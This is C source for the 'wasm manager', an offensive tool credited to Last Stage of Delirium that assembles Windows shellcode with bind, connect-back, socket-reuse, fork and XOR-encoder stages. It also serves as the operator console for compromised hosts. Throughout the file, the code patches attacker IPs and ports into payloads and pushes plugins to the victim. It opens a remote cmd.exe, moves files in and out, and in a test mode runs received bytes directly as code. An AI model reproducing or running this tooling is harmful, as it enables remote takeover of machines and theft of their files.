/*## copyright LAST STAGE OF DELIRIUM aug 2002 poland        *://lsd-pl.net/ #*/
/*## wasm manager                                                            #*/

#ifdef WINDOWS
#include <winsock2.h>
#include <windows.h>
#include <io.h>
#define F 
#else
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include <netdb.h>
#include <errno.h>
#include <string.h>
#define O_BINARY 0
#define F fflush(stdout);
#endif
#include <fcntl.h>
#include <stdio.h>

#define fil "wasm.dat"

#define ui32 unsigned int
#define ui16 unsigned short
#define ui08 unsigned char

typedef struct{
    ui08 b[2048];ui32 l;
}wp_t;

typedef struct{
    char fmt[256],adr[128];
    ui32 ip,delay,fd,t;
    ui16 port;
    wp_t a,*prolog,*epilog;
}wa_t;

int wa_ini(wa_t *wa);
int wa_cfg(wa_t *wa,char *f,char *c,int s,char *a,wp_t *prolog,wp_t *epilog);
int wa_asm(wa_t *wa);
int wa_net(wa_t *wa);

enum{WA_CLNT,WA_SERV,WA_FD,WA_TEST};
ui08 wa_buf[10000];ui32 val32;ui16 val16;
ui32 wa_interrupt=0;

#define PUTI32(b,i) val32=i;memcpy((char*)(b),(char*)&val32,4);
#define PUTI16(b,i) val16=i;memcpy((char*)(b),(char*)&val16,2);
#define PUTI08(b,i) *(ui08*)(b)=(ui08)(i);

int rev16(short a){
    int i=1;
    if((*(char*)&i)) return(a);
    return(((a>>8)&0xff)|((a&0xff)<<8));
}

int rev32(int a){
    int i=1;
    if((*(char*)&i)) return(a);
    return((a>>24)&0xff)|(((a>>16)&0xff)<<8)|(((a>>8)&0xff)<<16)|((a&0xff)<<24);
}

int sig(int i){
#ifdef WINDOWS
    if(i!=CTRL_C_EVENT) return(0);
#else
    signal(SIGQUIT,(void (*)(int))sig);
    signal(SIGINT,(void (*)(int))sig);
#endif
    wa_interrupt=1;
    return(1); 
}

ui08 rela[]={
    0x8d,0xb5,0,0,0,0,         /* lea   esi,[ebp+0x????????]     */ 
    0x81,0xec,0,4,0,0,         /* sub   esp,1024                 */
    0x8d,0x6c,0x24,0x7c        /* lea   ebp,[esp+0x7c]           */
};

ui08 stub[]={
    0x8d,0x86,0,0,0,0,         /* lea   eax,[esi+0x????????]     */
    0x8d,0x78,0,               /* lea   edi,[eax-0x??]           */
    0xff,0xd6                  /* call  esi                      */
};

ui08 disp[]={
    0x8d,0x86,0,0,0,0,         /* lea   eax,[esi+0x????????]     */
    0xff,0xd0                  /* call  eax                      */
};

ui08 jump[]={
    0xeb,0                     /* jmp   0x??                     */
};

wp_t ep_kill={
    "\x33\xc0"                 /* xor   eax,eax                  */
    "\x50"                     /* push  eax                      */
    "\x48"                     /* dec   eax                      */
    "\x50"                     /* push  eax                      */
    "\xff\x55\xb4",            /* call  [ebp+@@_TerminateProcess */
    8
};

wp_t ep_plug={
    "\x81\xc4\x00\x04\x00\x00" /* add   esp,400h                 */
    "\xc3",                    /* ret                            */
    7
};

struct comp{char *name;ui32 f,s,adr,len,dat;}ctab[9]={
    {"null",0,0,0,0,0},
    {"xore",0,0,0,0,0},
    {"init",0,sizeof(rela),0,0,0},
    {"fork",0,sizeof(stub)+sizeof(jump)+sizeof(rela),0,0,0},
    {"wsai",0,sizeof(stub),0,0,0},
    {"bind",0,sizeof(stub),0,0,0},
    {"conn",0,sizeof(stub),0,0,0},
    {"find",0,sizeof(stub),0,0,0},
    {"disp",0,sizeof(disp),0,0,0}
};

enum{cNULL=0,cXORE=1,cINIT=2,cFORK=3,cWSAI=4,cBIND=5,cCONN=6,cFIND=7,cDISP=8};
enum{pMAIN=0};
enum{vXVAL=0,vXLEN=1,vBPRT=2,vCADR=3,vCPRT=4,vCDEL=5,vFPRT=6};
enum{kHELP=0,kEXIT=1,kKILL=2,kCMD=3,kPUT=4,kGET=5,kINST=6};

struct cmd{char *c;int l,plug,reload;}cmds[7]={
    {"help",4,0,-1},{"exit",4,0,-1},{"kill",4,1,-1},{"cmd" ,3,2, 0},
    {"put" ,3,2, 0},{"get" ,3,2, 0},{"inst",4,3, 1}
};

char *hlp=
    "cmd  -execute cmd.exe (to quit type 'exit' or press CTRL-C)\n"
    "put  c:\\file.txt -upload file.txt from local directory to c:\\ \n"
    "get  c:\\file.txt -download file.txt from c:\\ to local directory\n"
    "inst bind(1234) -fork,bind and listen on 1234 port\n"
    "inst conn(1.2.3.4,1234,60) -fork,try connect to 1.2.3.4 1234 every 60s\n"
    "kill -terminate the process\n"
    "exit -disconnect\n"
;

int wa_ini(wa_t *wa){
#ifdef WINDOWS
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,0),&wsa);
#endif
    return(0);
}

int wa_cfg(wa_t *wa,char *fmt,char *cfg,int sck,char *adr,wp_t *p,wp_t *e){
    struct hostent *hp;
    struct sockaddr_in in;
    char tmp[128],*c,*c1,*c2;
    int i;

    sprintf(wa->fmt,fmt,cfg);
    strncpy(wa->adr,adr?adr:"0.0.0.0",128);
    wa->prolog=p;
    wa->epilog=e;

    if(!strncmp(wa->fmt,"mgmt",4)){
        printf("[ %s\n",wa->fmt);
        c=strstr(wa->fmt,"test");

        if((c=strstr(wa->fmt,"test"))!=NULL){
            wa->t=WA_TEST;
            strncpy(tmp,&c[5],8);tmp[7]=0;
            wa->port=htons((ui16)atoi(tmp));
        }
        if((c=strstr(wa->fmt,"bind"))!=NULL){
            wa->t=WA_SERV;
            strncpy(tmp,&c[5],8);tmp[7]=0;
            wa->port=htons((ui16)atoi(tmp));
        }
        if((c=strstr(wa->fmt,"conn"))!=NULL){
            wa->t=WA_CLNT;
            c1=&c[5];
            while(*c1) {if(*c1==',') break; c1++;}
            if(*c1==0) goto err;
            strncpy(wa->adr,&c[5],c1-&c[5]);
            wa->adr[c1-&c[5]]=0;
            strncpy(tmp,c1+1,8);tmp[7]=0;
            wa->port=htons((ui16)atoi(tmp));
        }
    }

    if(!strncmp(wa->fmt,"core",4)){
        if((c=strstr(wa->fmt,"bind"))!=NULL){
            wa->t=WA_CLNT;
            c1=&c[5];
            c2=c1;
            while(*c2) {if(*c2==')') break; c2++;}
            if(*c2==0) goto err;
            strncpy(tmp,c1,c2-c1);tmp[c2-c1]=0;
            wa->port=htons((ui16)atoi(tmp));
        }
        if((c=strstr(wa->fmt,"conn"))!=NULL){
            wa->t=WA_SERV;
    
            c1=&c[5];
            c2=c1;
            while(*c2) {if(*c2==',') break; c2++;}
            if(*c2==0) goto err;
            strncpy(wa->adr,c1,c2-c1);
            wa->adr[c2-c1]=0;
            c2++;

            c1=c2;
            c2=c1;
            while(*c2) {if(*c2==',') break; c2++;}
            if(*c2==0) goto err;
            strncpy(tmp,c1,c2-c1);tmp[c2-c1]=0;
            wa->port=htons((ui16)atoi(tmp));
            c2++;

            c1=c2;
            c2=c1;
            while(*c2) {if(*c2==')') break; c2++;}
            if(*c2==0) goto err;
            strncpy(tmp,c1,c2-c1);tmp[c2-c1]=0;
            wa->delay=atoi(tmp)*1000;
        }
        if((c=strstr(wa->fmt,"find"))!=NULL){
            wa->t=WA_FD;

            i=sizeof(struct sockaddr_in);
            if(getsockname(sck,(struct sockaddr*)&in,&i)==-1){
#ifndef WINDOWS
                struct{ui32 maxlen;ui32 len;char *buf;}nb;
                ioctl(sck,(('S'<<8)|2),"sockmod");
                nb.maxlen=0xffff;
                nb.len=sizeof(struct sockaddr_in);;
                nb.buf=(char*)&in;
                ioctl(sck,(('T'<<8)|144),&nb);
#endif
            }
            wa->port=in.sin_port;
            wa->fd=sck;
        }
    }

    if((wa->ip=inet_addr(wa->adr))==-1){
        if((hp=gethostbyname(wa->adr))==NULL) goto err;
        memcpy(&wa->ip,hp->h_addr,4);
    }
    return(0);
err:
    printf("[ err: wa_cfg()\n");exit(0);
}

int wa_asm(wa_t *wa){
    FILE *fp;
    char *ff,*fmt;
    int ll1,ll2,ll3,j,cnt,cidx=0;
    ui08 x[255]={0},xv,*REL,*b,*c;
    ui32 *II,*IP,*IV,*IS,i,h,p,*a;
    static wa_t wa_tmp;

    if((fp=fopen(fil,"rb"))==NULL) goto err;
    if((cnt=fread(wa_buf,1,10000,fp))<=0) goto err; 
    fclose(fp);

    for(j=0;j<cnt;j++) if(!strncmp((char*)&wa_buf[j],"WINASM",6)) break;
    if(j==cnt) goto err;

    REL=(ui08*)((((ui32)wa_buf)+4)&~0x03);
    memcpy(REL,&wa_buf[j+8],cnt-j);

    II=(ui32*)(REL+rev32(*(ui32*)&REL[0x04]));
    IP=(ui32*)(REL+rev32(*(ui32*)&REL[0x08]));
    IV=(ui32*)(REL+rev32(*(ui32*)&REL[0x0c]));
    IS=(ui32*)(REL+rev32(*(ui32*)&REL[0x10]));

    for(;*IS;IS++){
        a=(ui32*)(REL+rev32(*IS));
        while(*a){
            c=((ui08*)a)-rev32(*a);
            for(h=0,p=0;c[p];p++) h=((h<<5)|(h>>27))+c[p];
            *a++=rev32(h);
        }
    } 

    fmt=wa->fmt;
    if(!strncmp(fmt,"core: ",6)) goto core;
    if(!strncmp(fmt,"plug: ",6)) goto plug;
    goto err;

core:
    fmt+=6;

    for(i=0;i<9;i++){
        ctab[i].adr=(ui32)(REL+rev32(II[i*4+1]));
        ctab[i].len=rev32(II[i*4+2]);
        ctab[i].dat=rev32(II[i*4+3]);
        ctab[i].f=0;
    }

    for(ff=fmt;*ff;ff++,fmt=ff){ 
        while((*ff!=',')&&(*ff!='(')&&(*ff!=0)) ff++;
        for(i=0;i<9;i++) if(!strncmp(ctab[i].name,fmt,ff-fmt)){
            if(*ff=='(') {while((*ff!=')')&&(*ff!=0)) ff++; ff++;}
            ctab[i].f=1;
            break;
        }
    }

    if(ctab[cXORE].f==0&&ctab[cNULL].f==0) goto use;
    if(ctab[cBIND].f==0&&ctab[cCONN].f==0&&ctab[cFIND].f==0) goto use;
    if(ctab[cFORK].f==1&&ctab[cFIND].f==1) goto use;
    if(ctab[cFORK].f==1) ctab[cWSAI].f=1;
    if(ctab[cFORK].f==1&&(wa->epilog==NULL)) wa->epilog=&ep_kill;

    ll1=0;
    for(i=0;i<9;i++){
        if(ctab[i].f==0) continue;

        if(i==cBIND){
            PUTI16(ctab[i].adr+ctab[i].dat+rev32(IV[vBPRT]),wa->port);
        }
        if(i==cCONN){
            PUTI32(ctab[i].adr+ctab[i].dat+rev32(IV[vCADR]),wa->ip);
            PUTI16(ctab[i].adr+ctab[i].dat+rev32(IV[vCPRT]),wa->port);
            PUTI32(ctab[i].adr+ctab[i].dat+rev32(IV[vCDEL]),wa->delay);
        }
        if(i==cFIND){
            PUTI16(ctab[i].adr+ctab[i].dat+rev32(IV[vFPRT]),wa->port);
        }
        ll1+=ctab[i].s;
    }

    if(ctab[cFIND].f) ll1+=ep_kill.l;
    else ll1+=sizeof(jump);
    ll1+=wa->epilog?wa->epilog->l:0;
    ll2=ll1+ctab[cINIT].dat;
    ll3=ll1+ctab[cINIT].len;

    b=wa->a.b;

    if(wa->prolog) {memcpy(b,wa->prolog->b,i=wa->prolog->l);b+=i;}
    if(ctab[cNULL].f) {memcpy(b,(char*)ctab[cNULL].adr,i=ctab[cNULL].len);b+=i;}
    if(ctab[cXORE].f) {memcpy(b,(char*)ctab[cXORE].adr,i=ctab[cXORE].len);b+=i;}
    PUTI32(&rela[2],rev32(ll2));
    memcpy(b,rela,i=sizeof(rela));b+=i;

    if(ctab[cFORK].f){
        PUTI32(&stub[2],rev32(ll3+ctab[cFORK].dat-ll2));ll3+=ctab[cFORK].len;
        PUTI08(&stub[8],0x100-ctab[cFORK].dat);
        PUTI08(&jump[1],sizeof(rela)+2*sizeof(stub)+sizeof(disp)+sizeof(jump));
        PUTI32(&rela[2],rev32(ll2-(sizeof(rela)+sizeof(stub)+2)));
        memcpy(b,stub,i=sizeof(stub));b+=i;
        memcpy(b,jump,i=sizeof(jump));b+=i;
        memcpy(b,rela,i=sizeof(rela));b+=i;
    }

    if(ctab[cWSAI].f){
        PUTI32(&stub[2],rev32(ll3+ctab[cWSAI].dat-ll2));ll3+=ctab[cWSAI].len;
        PUTI08(&stub[8],0x100-ctab[cWSAI].dat);
        memcpy(b,stub,i=sizeof(stub));b+=i;
    }

    if(ctab[cBIND].f){
        PUTI32(&stub[2],rev32(ll3+ctab[cBIND].dat-ll2));ll3+=ctab[cBIND].len;
        PUTI08(&stub[8],0x100-ctab[cBIND].dat);
        memcpy(b,stub,i=sizeof(stub));b+=i;
    }

    if(ctab[cCONN].f){
        PUTI32(&stub[2],rev32(ll3+ctab[cCONN].dat-ll2));ll3+=ctab[cCONN].len;
        PUTI08(&stub[8],0x100-ctab[cCONN].dat);
        memcpy(b,stub,i=sizeof(stub));b+=i;
    }

    if(ctab[cFIND].f){
        PUTI32(&stub[2],rev32(ll3+ctab[cFIND].dat-ll2));ll3+=ctab[cFIND].len;
        PUTI08(&stub[8],0x100-ctab[cFIND].dat);
        memcpy(b,stub,i=sizeof(stub));b+=i;
    }

    PUTI32(&disp[2],rev32(ll3+ctab[cDISP].dat-ll2));ll3+=ctab[cDISP].len;
    PUTI08(&jump[1],0x100-(sizeof(stub)+sizeof(disp)+sizeof(jump)));
    memcpy(b,disp,i=sizeof(disp));b+=i;

    if(ctab[cFIND].f) {memcpy(b,ep_kill.b,i=ep_kill.l);b+=i;}
    else {memcpy(b,jump,i=sizeof(jump));b+=i;}

    if(wa->epilog) {memcpy(b,wa->epilog->b,i=wa->epilog->l);b+=i;}

    if(ctab[cINIT].f) {memcpy(b,(char*)ctab[cINIT].adr,i=ctab[cINIT].len);b+=i;}
    if(ctab[cFORK].f) {memcpy(b,(char*)ctab[cFORK].adr,i=ctab[cFORK].len);b+=i;}
    if(ctab[cWSAI].f) {memcpy(b,(char*)ctab[cWSAI].adr,i=ctab[cWSAI].len);b+=i;}
    if(ctab[cBIND].f) {memcpy(b,(char*)ctab[cBIND].adr,i=ctab[cBIND].len);b+=i;}
    if(ctab[cCONN].f) {memcpy(b,(char*)ctab[cCONN].adr,i=ctab[cCONN].len);b+=i;}
    if(ctab[cFIND].f) {memcpy(b,(char*)ctab[cFIND].adr,i=ctab[cFIND].len);b+=i;}
    if(ctab[cDISP].f) {memcpy(b,(char*)ctab[cDISP].adr,i=ctab[cDISP].len);b+=i;}

    wa->a.l=b-wa->a.b;

    if(ctab[cXORE].f){
        ui32 p,o,l;

        p=wa->prolog?wa->prolog->l:0;
        o=ctab[cXORE].len+p;
        l=wa->a.l;
 
        for(i=o;i<l;i++) x[wa->a.b[i]]=1;
        for(i=255;i>=0;i--) if(x[i]==0) break;
        xv=i;
        for(i=o;i<l;i++) wa->a.b[i]=wa->a.b[i]^xv;
 
        PUTI08(wa->a.b+p+rev32(IV[vXVAL]),xv&0xff);
        PUTI16(wa->a.b+p+rev32(IV[vXLEN]),rev16((ui16)(l-o)));
    }

    if(wa!=&wa_tmp) printf("[ %s (%d bytes)\n",wa->fmt,wa->a.l);
    return(0);

plug:
    fmt+=6;

    if((!strncmp(fmt,"bind",4))||(!strncmp(fmt,"conn",4))){
        wa_cfg(&wa_tmp,"core: null,init,fork,wsai,%s,disp",fmt,0,0,0,&ep_plug);
        wa_asm(&wa_tmp);

        b=wa->a.b;
        memcpy(b,"\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",i=12);b+=i;
        memcpy(b,wa_tmp.a.b,i=wa_tmp.a.l);b+=i;
        wa->a.l=wa_tmp.a.l+12;
    }

    if(!strncmp(fmt,"main",4)){
        PUTI32(&wa->a.b,rev32(rev32(IP[pMAIN*4+3])));
        memcpy(&wa->a.b[4],REL+rev32(IP[pMAIN*4+1]),rev32(IP[pMAIN*4+2]));
        wa->a.l=4+rev32(IP[pMAIN*4+2]);
    }

    printf("[ %s (%d bytes)\n",wa->fmt,wa->a.l);
    return(0);
err:
    printf("[ err: wa_asm()\n");
    exit(0);
use:
    printf("[ err: syntax\n");
    exit(0);
}

int wa_net(wa_t *wa){
    struct sockaddr_in adr;
    fd_set fds;
    int fd,sck,file,cnt,i,j,mode=1;
    ui32 c,off=0,p=1;
    char buf[64],*f;
    static wa_t wa_plug;

#ifdef WINDOWS
    HANDLE hevt[2],hinp,hout;
    WSANETWORKEVENTS wsa_e; 
    WSAEVENT e;
#endif

    if(wa->t!=WA_FD){
        if(wa->adr[0]==0) strcpy(wa->adr,"0.0.0.0");

        sck=socket(AF_INET,SOCK_STREAM,0);

        adr.sin_family=AF_INET;
        adr.sin_port=wa->port;
        adr.sin_addr.s_addr=wa->ip;

        switch(wa->t){
        case WA_CLNT:
            printf("[ trying connect to %s %d\n",wa->adr,ntohs(wa->port));
#ifdef WINDOWS
            Sleep(1000);
#else
            sleep(1);
#endif
            if(connect(sck,(struct sockaddr*)&adr,sizeof(struct sockaddr_in))){
                goto err;
            }
            printf("[ connection established\n");
            fd=sck;
            break;
        case WA_SERV:
        case WA_TEST:
            printf("[ wait for connections %s %d\n",wa->adr,ntohs(wa->port));
            if(bind(sck,(struct sockaddr*)&adr,sizeof(struct sockaddr_in))){
                goto err;
            }
            listen(sck,1);
            i=sizeof(struct sockaddr);
            if((fd=accept(sck,(struct sockaddr*)&adr,&i))<0) goto err;
            printf("[ connection accepted\n");

            if(wa->t==WA_TEST){
                memset(wa->a.b,0,2048);
                i=recv(fd,wa->a.b,2048,0);
                printf("[ received %d bytes\n",i);
                if(i>0) (*(void (*)())wa->a.b)();
                exit(0);
            }
            break;
        }
    }else{
        sck=fd=wa->fd;
    }
    printf("[ ready\n");

#ifdef WINDOWS
    SetConsoleCtrlHandler((PHANDLER_ROUTINE)sig,TRUE);

    hinp=GetStdHandle(STD_INPUT_HANDLE);
    hout=GetStdHandle(STD_OUTPUT_HANDLE);

    e=WSACreateEvent();
    hevt[0]=hinp;
    hevt[1]=(HANDLE)e;
#else
    signal(SIGQUIT,(void (*)(int))sig);
    signal(SIGINT,(void (*)(int))sig);
#endif

    p=1;
    while(1){
        if(p) printf("> ");

#ifdef WINDOWS
        WSAEventSelect(fd,e,FD_READ|FD_CLOSE);
        i=WaitForMultipleObjects(2,hevt,FALSE,INFINITE)-WAIT_OBJECT_0;

        FD_ZERO(&fds);

        if(i==1){
            FD_SET((ui16)fd,&fds);
            WSAEnumNetworkEvents(fd,e,&wsa_e);
        }
        if(i==0){
            FD_SET(0,&fds);
        }
        WSAEventSelect(fd,e,0);
        ioctlsocket(fd,FIONBIO,&off);
#else
        fflush(stdout);
        FD_ZERO(&fds);
        FD_SET(fd,&fds);
        FD_SET(0,&fds);
        select(FD_SETSIZE,&fds,NULL,NULL,NULL);
#endif

        if(wa_interrupt){
            if(!mode){
                printf("\n[ CTRL-C\n");
                send(fd,"\x00",1,0);
                while(1){
                    if((cnt=recv(fd,buf,1,0))<=0) goto end;
                    if((cnt=(ui32)buf[0])==0) break;
                }
                printf("[ end\n");
            }
            wa_interrupt=0;
            mode=1;p=1;
            continue;
        }

        if(FD_ISSET(fd,&fds)){
            if((cnt=recv(fd,buf,1,0))<=0) goto end;
            if((cnt=(ui32)buf[0])==0) {mode=1;p=1;continue;}
            for(i=0;i<cnt;i+=j) if((j=recv(fd,&buf[i],cnt-i,0))<=0) goto end;
        }

        if(FD_ISSET(0,&fds)){
            memset(buf,0,64);
#ifdef WINDOWS
            if(!ReadFile(hinp,&buf[1],64-4,&cnt,NULL)) goto err;
            if(!cnt) continue;
            if(mode) buf[1+cnt-2]=0;
#else
            if((cnt=read(0,&buf[1],64-4))<1) goto err;
            if(mode) buf[1+cnt-1]=0;
#endif
        }

        if(mode) goto cmds;
        else goto data;

cmds:
        if(FD_ISSET(fd,&fds)) continue;
        if(!FD_ISSET(0,&fds)) continue;

        for(c=0;c<7;c++) if(!strncmp(&buf[1],cmds[c].c,cmds[c].l)) break;
        if(c==7) continue;

        if(cmds[c].plug==2){
            wa_cfg(&wa_plug,"plug: %s","main",0,NULL,0,0);
            wa_asm(&wa_plug);
        }
        if(cmds[c].plug==3){
            wa_cfg(&wa_plug,"plug: %s",&buf[6],0,NULL,0,0);
            wa_asm(&wa_plug);
        }

        if(cmds[c].plug>1){
            char buf[64];
            int pnum;

            pnum=cmds[c].plug|((cmds[c].reload)?0x80000000:0);
            PUTI08(&buf[0],4);
            PUTI32(&buf[1],rev32(pnum));
            send(fd,buf,1+4,0);

            if((cnt=recv(fd,buf,1,0))<=0) goto end;

            if((cnt=(ui32)buf[0])!=0){
                if((cnt=recv(fd,buf,cnt,0))<=0) goto end;

                printf("[ uploading\n",wa_plug.a.l);

                for(cnt=0;cnt<wa_plug.a.l;cnt+=i){
                    i=((wa_plug.a.l-cnt)>60)?60:(wa_plug.a.l-cnt);
                    PUTI08(&buf[0],i);
                    memcpy(&buf[1],&wa_plug.a.b[cnt],i);
                    send(fd,buf,1+i,0);
                }
                send(fd,"\x00",1,0);
            }
        }

        switch(c){
        case kHELP:
            printf(hlp);
            p=0;
            break;
        case kEXIT:
            send(fd,"\x04\x00\x00\x00\x00",1+4,0);
            p=0;
            continue;
        case kKILL:
            send(fd,"\x04\x01\x00\x00\x00",1+4,0);
            p=0;
            continue;
        case kCMD:
            printf("[ run cmd.exe\n");
            send(fd,"\x04\x01\x00\x00\x00",1+4,0);
            mode=0;p=0;
            continue;
        case kGET:
            f=((f=strrchr(&buf[5],'\\'))?f+1:&buf[5]);
            printf("[ transfer %s %s to %s\n",wa->adr,&buf[5],f);

            if((file=open(f,O_RDWR|O_CREAT|O_EXCL|O_BINARY,0666))==-1){
                printf("[ err: file not created\n");
            }

            PUTI08(&buf[0],4+strlen(&buf[5])+1);
            PUTI32(&buf[1],rev32(0x00000002));
            send(fd,buf,1+4+strlen(&buf[5])+1,0);

            while(1){
                if((cnt=recv(fd,buf,1,0))<=0) goto end;
                if((cnt=(ui32)buf[0])==0) break;
                for(i=0;i<cnt;i+=j){
                    if((j=recv(fd,&buf[i],cnt-i,0))<=0) goto end;
                }
                write(file,&buf[0],cnt);
            }
            close(file);
            printf("[ end\n");
            continue;
        case kPUT:
            f=((f=strrchr(&buf[5],'\\'))?f+1:&buf[5]);
            printf("[ transfer %s to %s %s\n",f,wa->adr,&buf[5]);

            if((file=open(f,O_RDONLY|O_BINARY))==-1){
                printf("[ err: file not found\n");
            }

            PUTI08(&buf[0],4+strlen(&buf[5])+1);
            PUTI32(&buf[1],rev32(0x00000003));
            send(fd,buf,1+4+strlen(&buf[5])+1,0);

            while(1){
                if((cnt=read(file,&buf[1],64-4))<=0) break;
                PUTI08(&buf[0],cnt);
                send(fd,buf,1+cnt,0);
            }
            send(fd,"\x00",1,0);
            close(file);
            printf("[ end\n");
            continue;
        }
        p=1;
        continue;

data:
        if(FD_ISSET(fd,&fds)){
#ifdef WINDOWS
            WriteFile(hout,buf,cnt,&i,NULL);
#else
            write(1,buf,cnt);
#endif
        }
        if(FD_ISSET(0,&fds)){
            PUTI08(&buf[0],cnt);
            send(fd,buf,1+cnt,0);
        }
        continue;

    }

end:
    printf("%s[ end\n",p?"\n":"");
    return(0);
err:
    printf("[ err: wa_net()\n");
    return(0);
}

#ifdef WASM
int main(int argc,char **argv){
    wa_t wa;

    printf("copyright LAST STAGE OF DELIRIUM apr 2003 poland  //lsd-pl.net/\n");
    printf("wasm manager\n\n");

    if(argc==1) {printf("usage: wasm -n wacfg\n");exit(0);}

    wa_ini(&wa);
    wa_cfg(&wa,"mgmt: %s",argv[2],0,NULL,0,0);
    wa_net(&wa);
}
#endif

